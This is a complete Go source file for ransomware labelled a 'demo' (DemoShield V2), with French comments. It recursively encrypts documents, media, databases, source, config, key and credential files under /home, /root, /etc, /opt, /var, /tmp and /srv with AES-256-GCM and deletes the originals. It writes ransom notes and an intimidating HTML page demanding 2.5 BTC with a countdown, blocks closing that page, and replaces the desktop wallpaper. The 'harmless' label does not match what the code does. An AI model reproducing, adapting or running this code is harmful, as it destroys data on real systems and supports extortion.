// demoshield.go --- Demo ransomware V2 - Version Complète
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
)

const (
	keyFileName = ".demokey"
	encSuffix   = ".demoenc"
	noteFile    = "README_DEMO.txt"
	bgImageName = "pelestorm.png"
	noteContent = `🔐 DEMO RANSOMWARE - INOFFENSIF 🔐

VOS FICHIERS ONT ETE CHIFFRES avec AES-256-GCM.

💀 PAYMENT REQUIRED: 2.5 BTC 💀

Pour restaurer: ./demoshield --decrypt

⚠️ N'ESSAYEZ PAS DE TRICHER ⚠️
- Toute tentative de décryptage sans la clé détruira définitivement vos données
- Le compteur est en cours d'exécution
- La clé sera détruite automatiquement`
)

// Page HTML beaucoup plus effrayante avec fond d'écran personnalisé
var htmlContent = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 SECURITY BREACH - RANSOMWARE DETECTED</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background: #000;
            font-family: 'Share Tech Mono', 'Orbitron', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        
        /* Fond d'écran avec l'image pelestorm.png */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('pelestorm.png') center/cover no-repeat;
            opacity: 0.3;
            z-index: 0;
            animation: glitch 8s infinite;
        }
        
        /* Overlay pour assombrir */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.75);
            z-index: 0;
        }
        
        @keyframes glitch {
            0%, 90%, 100% { opacity: 0.3; }
            92% { opacity: 0.1; transform: scale(1.01) translateX(-2px); }
            94% { opacity: 0.4; transform: scale(0.99) translateX(2px); }
            96% { opacity: 0.15; transform: scale(1.02) translateX(-1px); }
            98% { opacity: 0.35; transform: scale(0.98) translateX(1px); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            max-width: 950px;
            width: 95%;
            padding: 40px;
            border: 3px solid #ff0000;
            border-radius: 15px;
            background: rgba(0, 0, 0, 0.92);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3), inset 0 0 50px rgba(255, 0, 0, 0.1);
            animation: pulse-border 2s infinite;
        }
        
        @keyframes pulse-border {
            0%, 100% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.3), inset 0 0 50px rgba(255, 0, 0, 0.1); }
            50% { box-shadow: 0 0 80px rgba(255, 0, 0, 0.5), inset 0 0 80px rgba(255, 0, 0, 0.2); }
        }
        
        .skull {
            text-align: center;
            font-size: 4em;
            animation: float-skull 3s ease-in-out infinite;
            color: #ff0000;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }
        
        @keyframes float-skull {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        h1 {
            text-align: center;
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            font-size: 2.2em;
            color: #ff0000;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.6), 0 0 40px rgba(255, 0, 0, 0.3);
            margin: 10px 0;
            animation: flicker 3s infinite;
        }
        
        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
            20%, 24%, 55% { opacity: 0.4; }
        }
        
        .subtitle {
            text-align: center;
            color: #ff6666;
            font-size: 0.9em;
            letter-spacing: 3px;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
            margin-bottom: 15px;
        }
        
        .glitch-text {
            animation: glitch-text 4s infinite;
        }
        
        @keyframes glitch-text {
            0%, 90%, 100% { opacity: 1; }
            92% { opacity: 0.8; transform: translateX(-3px); }
            94% { opacity: 1; transform: translateX(3px); }
            96% { opacity: 0.6; transform: translateX(-2px); }
            98% { opacity: 1; transform: translateX(2px); }
        }
        
        .timer-section {
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            border: 2px solid #ff0000;
            background: rgba(255, 0, 0, 0.05);
            border-radius: 10px;
            position: relative;
            overflow: hidden;
        }
        
        .timer-section::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 0, 0, 0.03), transparent);
            animation: scan 4s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(-100%) rotate(45deg); }
            100% { transform: translateY(100%) rotate(45deg); }
        }
        
        .timer-title {
            color: #ff4444;
            font-size: 1.1em;
            font-weight: bold;
            position: relative;
            z-index: 1;
        }
        
        #countdown {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 15px 0;
            position: relative;
            z-index: 1;
        }
        
        .time-block {
            padding: 15px 25px;
            border: 2px solid #ff0000;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 8px;
            min-width: 80px;
            position: relative;
        }
        
        .time-block .num {
            font-family: 'Orbitron', monospace;
            font-size: 3em;
            font-weight: 700;
            color: #ff0000;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        .time-block .label {
            font-size: 0.7em;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 2px;
            display: block;
            margin-top: 5px;
        }
        
        .timer-warning {
            color: #ff0000;
            font-weight: bold;
            animation: blink 0.5s infinite;
            position: relative;
            z-index: 1;
            font-size: 1.1em;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        
        .message {
            border-left: 5px solid #ff0000;
            padding: 20px;
            margin: 20px 0;
            background: rgba(255, 0, 0, 0.05);
        }
        
        .highlight {
            color: #ff0000;
            font-weight: bold;
            font-size: 1.2em;
        }
        
        .btc-section {
            margin: 25px 0;
            padding: 20px;
            border: 2px solid #ff8800;
            background: rgba(255, 136, 0, 0.05);
            text-align: center;
            border-radius: 10px;
        }
        
        .btc-section .title {
            color: #ff8800;
            font-size: 1.3em;
            font-weight: bold;
        }
        
        .btc-amount {
            color: #ff6600;
            font-size: 2.5em;
            font-weight: 900;
            text-shadow: 0 0 30px rgba(255, 136, 0, 0.3);
            margin: 10px 0;
        }
        
        .btc-address-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        
        .btc-address {
            background: rgba(0, 0, 0, 0.8);
            padding: 12px 20px;
            border: 1px solid #ff8800;
            color: #ff8800;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.9em;
            word-break: break-all;
            border-radius: 5px;
            flex: 1;
            min-width: 250px;
        }
        
        .copy-btn {
            background: transparent;
            border: 2px solid #ff8800;
            color: #ff8800;
            padding: 10px 25px;
            cursor: pointer;
            font-family: 'Share Tech Mono', monospace;
            font-weight: bold;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .copy-btn:hover {
            background: #ff8800;
            color: #000;
            box-shadow: 0 0 30px rgba(255, 136, 0, 0.3);
        }
        
        .warning-list {
            margin: 20px 0;
            padding: 15px;
            border: 1px solid #ff0000;
            background: rgba(255, 0, 0, 0.03);
            border-radius: 5px;
        }
        
        .warning-list li {
            color: #ff6666;
            list-style: none;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 0, 0, 0.1);
        }
        
        .warning-list li:last-child {
            border-bottom: none;
        }
        
        .warning-list li::before {
            content: '⚠️ ';
        }
        
        .footer {
            border-top: 2px solid #333;
            margin-top: 20px;
            padding-top: 15px;
            font-size: 0.75em;
            color: #555;
            text-align: center;
        }
        
        .footer .cmd {
            color: #00ff41;
            background: rgba(0, 255, 65, 0.1);
            padding: 5px 15px;
            border-radius: 3px;
            display: inline-block;
            border: 1px solid #00ff41;
        }
        
        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse-dot 1s infinite;
        }
        
        .status-dot.red {
            background: #ff0000;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: 0;
            opacity: 0.05;
            font-family: 'Share Tech Mono', monospace;
            color: #00ff00;
            font-size: 14px;
            overflow: hidden;
        }
        
        .security-badge {
            display: inline-block;
            padding: 5px 15px;
            border: 1px solid #ff0000;
            color: #ff0000;
            font-size: 0.7em;
            letter-spacing: 2px;
            margin: 5px 0;
        }
        
        @media (max-width: 600px) {
            .container { padding: 20px; }
            h1 { font-size: 1.5em; }
            .time-block { padding: 10px 15px; min-width: 60px; }
            .time-block .num { font-size: 2em; }
            .btc-amount { font-size: 1.8em; }
            .btc-address { font-size: 0.7em; min-width: 150px; }
        }
    </style>
</head>
<body>
    <!-- Effet Matrix en arrière-plan -->
    <div class="matrix-rain" id="matrix"></div>
    
    <div class="container">
        <div class="skull">💀</div>
        
        <h1 class="glitch-text">🔴 SYSTEM COMPROMISED</h1>
        <div class="subtitle">
            <span class="security-badge">⚠️ SECURITY BREACH</span>
            <span class="security-badge">🔐 AES-256-GCM</span>
            <span class="security-badge">💀 RANSOMWARE V2.0</span>
        </div>
        
        <div class="timer-section">
            <p class="timer-title">
                <span class="status-dot red"></span> 
                TIME REMAINING BEFORE KEY DELETION
            </p>
            <div id="countdown">
                <div class="time-block">
                    <span class="num" id="hours">10</span>
                    <span class="label">Heures</span>
                </div>
                <div class="time-block">
                    <span class="num" id="minutes">00</span>
                    <span class="label">Minutes</span>
                </div>
                <div class="time-block">
                    <span class="num" id="seconds">00</span>
                    <span class="label">Secondes</span>
                </div>
            </div>
            <p class="timer-warning">⚠️ KEYS WILL BE DESTROYED AFTER DELAY ⚠️</p>
            <p style="color:#666;font-size:0.8em;margin-top:10px;">Session ID: <span id="sessionId" style="color:#ff4444;">XXXX-XXXX-XXXX</span></p>
        </div>
        
        <div class="message">
            <p style="font-size:1.1em;margin-bottom:10px;">
                <span class="highlight">🔴 YOUR FILES HAVE BEEN ENCRYPTED</span>
            </p>
            <p style="color:#aaa;line-height:1.6;">
                All your files (documents, photos, databases, source code, etc.) 
                have been <span style="color:#ff0000;">encrypted</span> with 
                <strong>AES-256-GCM</strong> military-grade encryption.
            </p>
        </div>
        
        <div class="btc-section">
            <p class="title">💰 PAYMENT REQUIRED</p>
            <div class="btc-amount">2.5 BTC</div>
            <p style="color:#888;font-size:0.9em;">(~150,000 USD)</p>
            
            <div class="btc-address-container">
                <span class="btc-address" id="btcAddress">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
                <button class="copy-btn" onclick="copyBTC()">📋 COPY</button>
            </div>
            
            <div style="margin-top:10px;font-size:0.8em;color:#666;">
                <p>⏳ Payment deadline: <span style="color:#ff4444;" id="deadline">24h</span></p>
                <p style="margin-top:5px;">📊 Current status: <span style="color:#ff4444;font-weight:bold;">UNPAID</span></p>
            </div>
        </div>
        
        <div class="warning-list">
            <li>Do not attempt to decrypt your files without the correct key</li>
            <li>Any tampering will result in permanent data loss</li>
            <li>Contact us only via the provided channel</li>
            <li>You have 10 hours before the key is destroyed</li>
        </div>
        
        <div style="text-align:center;margin:15px 0;padding:10px;border:1px solid #ff0000;background:rgba(255,0,0,0.05);border-radius:5px;">
            <p style="color:#ff4444;font-size:0.9em;">
                🔥 <span id="encryptedCount">0</span> FILES ENCRYPTED
            </p>
        </div>
        
        <div class="footer">
            <p>🔧 Restore command:</p>
            <p><span class="cmd">./demoshield --decrypt</span></p>
            <p style="margin-top:10px;color:#333;">© 2026 Security Breach - All rights reserved</p>
        </div>
    </div>
    
    <script>
        // Compte à rebours de 10 heures
        (function() {
            var endTime = new Date().getTime() + 36000000; // 10 heures
            setInterval(function() {
                var now = new Date().getTime();
                var diff = endTime - now;
                
                if (diff <= 0) {
                    document.getElementById('hours').textContent = '00';
                    document.getElementById('minutes').textContent = '00';
                    document.getElementById('seconds').textContent = '00';
                    return;
                }
                
                var hours = Math.floor(diff / 3600000);
                var minutes = Math.floor((diff % 3600000) / 60000);
                var seconds = Math.floor((diff % 60000) / 1000);
                
                document.getElementById('hours').textContent = String(hours).padStart(2, '0');
                document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
                document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
            }, 1000);
        })();
        
        // Génération d'un ID de session
        (function() {
            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            var segments = [];
            for (var i = 0; i < 3; i++) {
                var seg = '';
                for (var j = 0; j < 4; j++) {
                    seg += chars[Math.floor(Math.random() * chars.length)];
                }
                segments.push(seg);
            }
            document.getElementById('sessionId').textContent = segments.join('-');
        })();
        
        // Compteur de fichiers (simulé)
        (function() {
            var count = Math.floor(Math.random() * 500) + 100;
            document.getElementById('encryptedCount').textContent = count.toLocaleString();
        })();
        
        // Effet Matrix
        (function() {
            var canvas = document.createElement('canvas');
            var container = document.getElementById('matrix');
            container.appendChild(canvas);
            var ctx = canvas.getContext('2d');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            var columns = Math.floor(canvas.width / 20);
            var drops = [];
            for (var i = 0; i < columns; i++) {
                drops[i] = Math.floor(Math.random() * canvas.height / 20);
            }
            
            var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            
            function drawMatrix() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#00ff00';
                ctx.font = '14px monospace';
                
                for (var i = 0; i < drops.length; i++) {
                    var char = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(char, i * 20, drops[i] * 20);
                    
                    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(drawMatrix, 50);
            
            window.addEventListener('resize', function() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                columns = Math.floor(canvas.width / 20);
                drops = [];
                for (var i = 0; i < columns; i++) {
                    drops[i] = Math.floor(Math.random() * canvas.height / 20);
                }
            });
        })();
        
        // Fonction de copie
        function copyBTC() {
            var address = document.getElementById('btcAddress').textContent;
            navigator.clipboard.writeText(address).then(function() {
                var btn = document.querySelector('.copy-btn');
                var originalText = btn.textContent;
                btn.textContent = '✅ COPIED!';
                btn.style.borderColor = '#00ff00';
                btn.style.color = '#00ff00';
                setTimeout(function() {
                    btn.textContent = originalText;
                    btn.style.borderColor = '#ff8800';
                    btn.style.color = '#ff8800';
                }, 2000);
            }).catch(function() {
                alert('Adresse BTC: ' + address);
            });
        }
        
        // Empêcher la fermeture de la page
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
        
        // Empêcher le clic droit
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        console.log('%c⚠️ SECURITY BREACH - SYSTEM COMPROMISED ⚠️', 'font-size:20px;color:#ff0000;font-weight:bold;');
        console.log('%c🔐 AES-256-GCM Encryption Active', 'font-size:14px;color:#ff8800;');
    </script>
</body>
</html>`

var rootDirs = []string{"/home", "/root", "/etc", "/opt", "/var", "/tmp", "/srv"}

var extensions = []string{
	".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
	".odt", ".ods", ".odp", ".rtf", ".csv",
	".pdf", ".epub", ".mobi",
	".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".tiff", ".svg", ".ico",
	".mp3", ".wav", ".flac", ".aac", ".ogg", ".wma", ".m4a",
	".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".m4v",
	".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".zst",
	".sql", ".db", ".sqlite", ".mdb", ".dbf",
	".py", ".go", ".js", ".ts", ".c", ".cpp", ".h", ".java", ".php", ".rb", ".pl",
	".json", ".xml", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf",
	".env", ".htaccess", ".htpasswd",
	".pem", ".key", ".pub", ".ppk", ".bak", ".old", ".backup",
	".sh", ".bash", ".md", ".markdown", ".gpg", ".pgp",
}

func generateKey() ([]byte, error) {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	return key, err
}

func saveKey(key []byte, keyPath string) error {
	os.MkdirAll(filepath.Dir(keyPath), 0700)
	return ioutil.WriteFile(keyPath, []byte(hex.EncodeToString(key)), 0600)
}

func loadKey(keyPath string) ([]byte, error) {
	data, err := ioutil.ReadFile(keyPath)
	if err != nil {
		return nil, err
	}
	return hex.DecodeString(strings.TrimSpace(string(data)))
}

func encryptFile(key []byte, path string, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()
	plaintext, err := ioutil.ReadFile(path)
	if err != nil {
		results <- fmt.Sprintf("[SKIP] %s (%v)", path, err)
		return
	}
	if len(plaintext) < 8 {
		return
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return
	}
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
	encPath := path + encSuffix
	ioutil.WriteFile(encPath, append(nonce, ciphertext...), 0644)
	os.Remove(path)
}

func isExcluded(path string) bool {
	excluded := []string{"/proc", "/sys", "/dev", "/run", "/lost+found", "/boot", "/lib", "/lib64", "/bin", "/sbin", "/usr/bin", "/usr/sbin", "/snap", "/var/cache", "/var/log"}
	for _, d := range excluded {
		if strings.HasPrefix(path, d) {
			return true
		}
	}
	if strings.HasSuffix(path, encSuffix) || strings.HasSuffix(path, keyFileName) {
		return true
	}
	return false
}

func encryptAll(key []byte) {
	fmt.Println("\n=== DEMOSHIELD V2 - Chiffrement ===")
	var wg sync.WaitGroup
	results := make(chan string, 1000)
	go func() {
		count := 0
		for range results {
			count++
		}
		fmt.Printf("\n%d fichiers chiffres.\n", count)
	}()
	for _, rootDir := range rootDirs {
		if _, err := os.Stat(rootDir); os.IsNotExist(err) {
			continue
		}
		filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
				return nil
			}
			if info.Size() == 0 || strings.HasSuffix(path, encSuffix) || strings.HasSuffix(path, keyFileName) {
				return nil
			}
			ext := strings.ToLower(filepath.Ext(path))
			for _, validExt := range extensions {
				if ext == validExt {
					wg.Add(1)
					go encryptFile(key, path, &wg, results)
					break
				}
			}
			return nil
		})
	}
	wg.Wait()
	close(results)
	deployRansomNotes()
	changeWallpaper()
	fmt.Println("\n[TERMINE] Utilisez --decrypt pour restaurer.\n")
}

func deployRansomNotes() {
	homeDirs := []string{"/root"}
	if f, err := os.Open("/home"); err == nil {
		users, _ := f.Readdirnames(-1)
		for _, u := range users {
			homeDirs = append(homeDirs, "/home/"+u)
		}
		f.Close()
	}
	nb := []byte(noteContent)
	hb := []byte(htmlContent)
	for _, dir := range homeDirs {
		if _, err := os.Stat(dir); err == nil {
			ioutil.WriteFile(dir+"/"+noteFile, nb, 0644)
			ioutil.WriteFile(dir+"/RANSOM_NOTE.html", hb, 0644)
		}
	}
}

func changeWallpaper() {
	// Rechercher l'image pelestorm.png
	bgPath := findBGImage()
	if bgPath == "" {
		fmt.Println("[!] Image pelestorm.png non trouvée, création d'un fond par défaut")
		bgPath = createDefaultBG()
		if bgPath == "" {
			fmt.Println("[!] Impossible de définir un fond d'écran")
			return
		}
	}

	fmt.Printf("[*] Utilisation de l'image: %s\n", bgPath)

	de := os.Getenv("XDG_CURRENT_DESKTOP")
	switch {
	case strings.Contains(strings.ToLower(de), "xfce"):
		exec.Command("xfconf-query", "-c", "xfce4-desktop", "-p", "/backdrop/screen0/monitor0/workspace0/last-image", "-s", bgPath).Run()
		exec.Command("xfdesktop", "--reload").Run()
	case strings.Contains(strings.ToLower(de), "gnome"):
		exec.Command("gsettings", "set", "org.gnome.desktop.background", "picture-uri", "file://"+bgPath).Run()
	case strings.Contains(strings.ToLower(de), "kde"):
		s := fmt.Sprintf(`var d = desktops()[0]; d.wallpaperPlugin = "org.kde.image"; d.currentConfigGroup = ["Wallpaper", "org.kde.image", "General"]; d.writeConfig("Image", "file://%s");`, bgPath)
		ioutil.WriteFile("/tmp/wall.js", []byte(s), 0644)
		exec.Command("qdbus", "org.kde.plasmashell", "/PlasmaShell", "org.kde.PlasmaShell.evaluateScript", "/tmp/wall.js").Run()
	default:
		exec.Command("feh", "--bg-scale", bgPath).Run()
		exec.Command("xwallpaper", "--zoom", bgPath).Run()
	}
}

func findBGImage() string {
	// Rechercher l'image dans différents emplacements
	locations := []string{
		"./" + bgImageName,
		"/root/" + bgImageName,
		os.Getenv("HOME") + "/" + bgImageName,
		"/tmp/" + bgImageName,
		os.Getenv("HOME") + "/Downloads/" + bgImageName,
		"/usr/share/backgrounds/" + bgImageName,
	}

	for _, loc := range locations {
		if _, err := os.Stat(loc); err == nil {
			// Copier l'image vers /root/ pour l'utiliser
			if loc != "/root/"+bgImageName {
				src, err := os.Open(loc)
				if err == nil {
					defer src.Close()
					dst, err := os.Create("/root/" + bgImageName)
					if err == nil {
						defer dst.Close()
						io.Copy(dst, src)
						return "/root/" + bgImageName
					}
				}
			}
			return loc
		}
	}
	return ""
}

func createDefaultBG() string {
	script := `#!/bin/bash
if command -v convert &>/dev/null; then
convert -size 1920x1080 xc:'#0a0000' -fill '#ff0000' -gravity North -pointsize 52 -annotate +0+80 '🔴 SYSTEM COMPROMISED' -fill '#666666' -gravity South -pointsize 16 -annotate +0+30 'DemoShield --decrypt' -fill '#ff8800' -gravity Center -pointsize 30 -annotate +0+0 '2.5 BTC REQUIRED' /root/pelestorm.png && echo ok
fi
`
	sPath := "/tmp/mkbg.sh"
	ioutil.WriteFile(sPath, []byte(script), 0755)
	defer os.Remove(sPath)
	out, err := exec.Command("bash", sPath).Output()
	if err == nil && strings.TrimSpace(string(out)) == "ok" {
		return "/root/pelestorm.png"
	}
	return ""
}

func decryptFile(key []byte, encPath string, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()
	data, err := ioutil.ReadFile(encPath)
	if err != nil {
		return
	}
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return
	}
	nonce, ct := data[:ns], data[ns:]
	pt, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return
	}
	orig := strings.TrimSuffix(encPath, encSuffix)
	ioutil.WriteFile(orig, pt, 0644)
	os.Remove(encPath)
}

func decryptAll(key []byte) {
	fmt.Println("\n=== DEMOSHIELD V2 - Dechiffrement ===")
	var wg sync.WaitGroup
	results := make(chan string, 1000)
	go func() {
		count := 0
		for range results {
			count++
		}
		fmt.Printf("\n%d fichiers dechiffres.\n", count)
	}()
	for _, rd := range rootDirs {
		if _, e := os.Stat(rd); os.IsNotExist(e) {
			continue
		}
		filepath.Walk(rd, func(p string, i os.FileInfo, e error) error {
			if e != nil {
				return nil
			}
			if i.IsDir() {
				if isExcluded(p) {
					return filepath.SkipDir
				}
				return nil
			}
			if strings.HasSuffix(p, encSuffix) {
				wg.Add(1)
				go decryptFile(key, p, &wg, results)
			}
			return nil
		})
	}
	wg.Wait()
	close(results)
	cleanupNotes()
}

func cleanupNotes() {
	homeDirs := []string{"/root"}
	if f, e := os.Open("/home"); e == nil {
		u, _ := f.Readdirnames(-1)
		for _, x := range u {
			homeDirs = append(homeDirs, "/home/"+x)
		}
		f.Close()
	}
	for _, d := range homeDirs {
		if _, err := os.Stat(d); err == nil {
			os.Remove(d + "/" + noteFile)
			os.Remove(d + "/RANSOM_NOTE.html")
		}
	}
}

func main() {
	encrypt := flag.Bool("encrypt", false, "Chiffre tous les fichiers")
	decrypt := flag.Bool("decrypt", false, "Restaure les fichiers")
	keyPath := flag.String("key", "", "Chemin vers .demokey")
	help := flag.Bool("help", false, "Aide")
	flag.Parse()

	fmt.Println("=== DEMOSHIELD V2 - RANSOMWARE SIMULATION ===")
	fmt.Println("[*] Recherche de l'image pelestorm.png...")

	if *help || (!*encrypt && !*decrypt) {
		fmt.Println("\nUsage: demoshield --encrypt | --decrypt [--key=path]")
		fmt.Println("\nOptions:")
		fmt.Println("  --encrypt    Chiffre tous les fichiers et affiche la page de rançon")
		fmt.Println("  --decrypt    Déchiffre les fichiers avec la clé")
		fmt.Println("  --key=path   Chemin personnalisé vers la clé de déchiffrement")
		fmt.Println("  --help       Affiche cette aide")
		fmt.Println("\n📁 L'image 'pelestorm.png' doit être dans le dossier actuel")
		return
	}

	if *encrypt {
		key, err := generateKey()
		if err != nil {
			fmt.Println("[FATAL]", err)
			return
		}
		saveKey(key, "/root/"+keyFileName)
		fmt.Println("[*] Clé sauvegardée dans /root/" + keyFileName)
		fmt.Println("[*] Début du chiffrement...")
		encryptAll(key)
	}

	if *decrypt {
		var key []byte
		var err error
		if *keyPath != "" {
			key, err = loadKey(*keyPath)
		} else {
			key, err = loadKey("/root/" + keyFileName)
			if err != nil {
				filepath.Walk("/home", func(p string, i os.FileInfo, e error) error {
					if e == nil && i.Name() == keyFileName {
						key, err = loadKey(p)
						return fmt.Errorf("found")
					}
					return nil
				})
			}
		}
		if err != nil {
			fmt.Println("[FATAL] Clé introuvable. Vérifiez le chemin ou le fichier .demokey")
			return
		}
		fmt.Println("[*] Début du déchiffrement...")
		decryptAll(key)
		os.Remove("/root/" + keyFileName)
		fmt.Println("[*] Nettoyage terminé")
	}
}
